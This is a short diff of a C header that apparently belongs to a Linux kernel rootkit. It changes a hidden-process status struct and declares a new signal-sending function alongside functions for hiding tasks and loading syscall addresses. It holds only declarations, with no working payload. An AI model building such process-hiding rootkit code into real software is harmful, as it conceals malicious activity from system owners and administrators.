@@ -45,7 +45,7 @@ struct hidden_tasks {
 
 struct hidden_status {
 	__be32 saddr;
-	bool hidden;
+	struct task_struct *task;
 };
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
@@ -115,6 +115,7 @@ void kv_rename_task(pid_t, const char *);
 void kv_show_saved_tasks(void);
 void kv_show_all_tasks(void);
 void kv_scan_and_hide(void);
+void kv_send_signal(int, struct task_struct *);
 
 /** syscall,function addresses */
 struct kernel_syscalls *kv_kall_load_addr(void);
